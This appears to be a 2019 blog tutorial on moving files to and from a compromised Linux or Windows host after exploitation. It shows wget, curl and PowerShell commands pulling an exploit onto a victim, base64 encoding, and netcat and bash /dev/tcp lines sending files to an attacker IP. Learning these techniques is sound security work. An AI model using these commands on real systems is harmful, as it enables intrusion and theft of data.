---
layout: post
title: Post Exploitation - File Transfer
subtitle: File Transfer
gh-repo: Sq00ky/Sq00ky.github.io
gh-badge:
  - star
  - fork
  - follow
tags:
  - Exploitation
  - Post
  - Hacking
  - Maintaining Access
  - Systems
comments: true
published: true
date: '2019-06-10'
---

You're sat in a dark room, only the light from your terminal illuminates behind you. You've just found a command injection vulnerability on a fortune 500 companies website. You're looking at a minimum $5,000 bug bounty, if you can successfully elevate privileges to root, you've just paid off your new car; You just dropped into your shell, confirmed that you're www-data, what next?
You run a uname -a to check the kernel version, and you see that the kernel is vulnerable to one of the most infamous exploits ever, CVE-2016-5195 - Dirty Cow. Without proper terminal access via SSH how can you transfer the file over?

## Post Exploitation - File Transfer

Linux offers a wide variety way of transfering files, some are more complex than other. Most methods here should be able to make use of pre-existing tools in most popular Linux distros.

# HTTP File Transfer

The simplest way of transfering files by far is hosting them on a web server. Fortunately, there is a really handy module that allows you to spawn a HTTP server on demand.
```
root@Sp00ky:~#python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
``` 

After hosting the file on your HTTP server (Ensure that HTTP is being forwarded on your network), you should be able to use wget or curl.
```
www-data@victim:~$ wget http://127.0.0.1/exploit.py
--2019-06-10 08:41:11--  http://127.0.0.1/exploit.py
Connecting to 127.0.0.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 34 [text/plain]
Saving to: ‘exploit.py.1’

exploit.py.1                  100%[=================================================>]      34  --.-KB/s    in 0s

2019-06-10 08:41:11 (1.57 MB/s) - ‘exploit.py’ saved [34/34]

www-data@victim:~$ls
exploit.py
```
Or with Curl, another command line utility for sending web request via CLI
```
www-data@victim:~$ curl -o exploit2.py http://127.0.0.1/exploit.py
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    34  100    34    0     0     23      0  0:00:01  0:00:01 --:--:--    23
www-data@victim:~$ls
exploit2.py
```
and for fun, Invoke-WebRequest with Powershell!
```
PS C:\Users\Victim> Invoke-WebRequest -Uri http://127.0.0.1/exploit.py -OutFile C:\Users\Victim\exploit.py
PS C:\Users\Victim> ls

    Directory: C:\Users\Victim

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
                    <output ommited>
-a----        6/10/2019   8:46 AM             34 exploit.py
```
As you can see, HTTP Servers are a very powerful way of transfering files to both Windows and Linux boxes, but what if HTTP was blocked?
Excellent question reader, Thankfully Base64 is another viable method!

# Base64 Method

This method works for both transfering files to the attacker and victim. On the attacking machine you'll want to print the output of the file, then pipe said output to base64, encoding the contents of a file.

```
root@Sp00ky:~# cat exploit.py |base64
dGhpcyBpcyBhIHRlc3QgZmlsZQppZ25vcmUgbWUgcGxzCg==
```

On the victim you can echo the contents of the file and pipe the output to base64 decode, then redirect the output from your terminal to a file.

```
www-data@victim:~$echo "dGhpcyBpcyBhIHRlc3QgZmlsZQppZ25vcmUgbWUgcGxzCg==" | base64 -d >> exploit.py
```

I personally recommended to keep it as a one-liner due to formatting formatting issues that may arrise.
# Netcat File Transfer and /dev/tcp

File transfer with netcat is fairly simple, to start you want to setup a listener on your attacking box
```
root@Sp00ky:~# nc -lp 1337 -i 5 > file.txt
```
The above statement is listening on port 1337, and after 5 seconds of inactivity, closing the session. This is how we will know the file transfer is complete. From the victim, we can do this with 2 ways, one being Netcat, the other being with /dev/tcp.
```
www-data@victim:~# nc 192.168.1.111 1337 < file.txt
```
The above statement is initiating a netcat session with the attacker, and is using bashes standard input to read the file and redirect it to netcat.
But lets say you're in an instance where netcat isn't avalible to you, thankfully bash has /dev/tcp/<ip>/<port> which will open a TCP socket.
```
www-data@victim:~# cat jellyfin_team.gpg.key < /dev/tcp/192.168.1.111/1337
```
and back on the attacking machine we can now read the file!
```
root@Sp00ky:~# cat ./file.txt
-----BEGIN PGP PUBLIC KEY BLOCK-----
<output omitted>
-----END PGP PUBLIC KEY BLOCK-----  
```
# The End
Thank you all for reading, that's all I have at the moment for file transfer methods, but I will be sure to add some more soon!
